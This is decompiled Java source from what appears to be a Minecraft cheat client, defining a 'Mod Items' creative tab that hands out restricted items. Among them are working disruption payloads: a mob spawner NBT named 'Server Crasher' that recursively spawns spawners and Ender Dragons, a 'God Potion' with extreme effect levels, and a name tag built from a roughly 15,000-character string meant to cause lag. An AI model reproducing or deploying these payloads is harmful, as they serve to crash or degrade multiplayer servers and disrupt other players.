/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  kotlin.jvm.internal.Intrinsics
 *  net.minecraft.creativetab.CreativeTabs
 *  net.minecraft.init.Blocks
 *  net.minecraft.item.Item
 *  net.minecraft.item.ItemStack
 */
package net.aspw.client.features.api;

import java.util.List;
import kotlin.jvm.internal.Intrinsics;
import net.aspw.client.util.item.ItemUtils;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;

public final class ModItems
extends CreativeTabs {
    public ModItems() {
        super("Mod Items");
    }

    public void displayAllReleventItems(List<ItemStack> itemList) {
        Intrinsics.checkNotNullParameter(itemList, (String)"itemList");
        StringBuilder lagStringBuilder = new StringBuilder();
        int n = 0;
        while (n < 500) {
            int i = n++;
            lagStringBuilder.append("/(!\u00a7()%/\u00a7)=/(!\u00a7()%/\u00a7)=/(!\u00a7()%/\u00a7)=");
        }
        ItemStack itemStack = ItemUtils.createItem("barrier 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"barrier 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("command_block 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"command_block 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("command_block_minecart 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"command_block_minecart 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("dragon_egg 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"dragon_egg 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("mob_spawner 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"mob_spawner 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("farmland 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"farmland 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("lit_furnace 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"lit_furnace 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("stone_slab 64 2");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"stone_slab 64 2\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("leaves 64 4");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"leaves 64 4\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("anvil 64 100");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"anvil 64 100\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("brown_mushroom_block 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"brown_mushroom_block 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("red_mushroom_block 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"red_mushroom_block 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("tallgrass 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"tallgrass 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("armor_stand 64 0 {EntityTag:{NoBasePlate:1,id:\"minecraft:armor_stand\",ShowArms:1,},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"armor_stand \u2026_stand\\\",ShowArms:1,},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("spawn_egg 64 0");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"spawn_egg 64 0\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("spawn_egg 64 64");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"spawn_egg 64 64\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("spawn_egg 64 63");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"spawn_egg 64 63\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("spawn_egg 64 53");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"spawn_egg 64 53\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("tripwire_hook 64 0 {display:{Name:\"key\"}}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"tripwire_hoo\u2026display:{Name:\\\"key\\\"}}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("chest 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:chest\",Lock:\"key\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"chest 64 0 {\u2026hest\\\",Lock:\\\"key\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("trapped_chest 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:chest\",Lock:\"key\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"trapped_ches\u2026hest\\\",Lock:\\\"key\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("furnace 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:furnace\",Lock:\"key\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"furnace 64 0\u2026nace\\\",Lock:\\\"key\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("dispenser 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:dispenser\",Lock:\"key\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"dispenser 64\u2026nser\\\",Lock:\\\"key\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("dropper 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:dropper\",Lock:\"key\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"dropper 64 0\u2026pper\\\",Lock:\\\"key\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("hopper 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:hopper\",Lock:\"key\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"hopper 64 0 \u2026pper\\\",Lock:\\\"key\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("mob_spawner 64 0 {BlockEntityTag:{MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{entity:{Motion:[0:0.0d,1:0.0d,2:0.0d,],BlockState:{Name:\"minecraft:spawner\",},Block:\"minecraft:mob_spawner\",Time:1,id:\"minecraft:falling_block\",TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d,],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20,},DropItem:0,},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20,},DropItem:0,},},id:\"minecraft:mob_spawner\",MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5,},display:{Name:\"\u00a74Server Crasher\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"mob_spawner \u2026\"\u00a74Server Crasher\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("potion 64 0 {CustomPotionEffects:[0:{Ambient:0b,ShowIcon:1b,ShowParticles:1b,Duration:19999980,Id:10b,Amplifier:125b,},1:{Ambient:0b,ShowIcon:1b,ShowParticles:1b,Duration:19999980,Id:11b,Amplifier:125b,},2:{Ambient:0b,ShowIcon:1b,ShowParticles:1b,Duration:19999980,Id:22b,Amplifier:4b,},],CustomPotionColor:16711680,display:{Name:\"\u00a76God Potion\",},}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"potion 64 0 \u2026me:\\\"\u00a76God Potion\\\",},}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("fireworks 64 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"fireworks 64\u2026:1b,FadeColors:[0,]}]}}\")");
        itemList.add(itemStack);
        itemStack = ItemUtils.createItem("name_tag 64 0 {display:{Name: \"" + lagStringBuilder + "\"}}");
        Intrinsics.checkNotNullExpressionValue((Object)itemStack, (String)"createItem(\"name_tag 64 \u2026\\\"$lagStringBuilder\\\"}}\")");
        itemList.add(itemStack);
    }

    public Item getTabIconItem() {
        Item item = new ItemStack(Blocks.command_block).getItem();
        Intrinsics.checkNotNullExpressionValue((Object)item, (String)"ItemStack(Blocks.command_block).item");
        return item;
    }

    public String getTranslatedTabLabel() {
        return "Mod Items";
    }
}

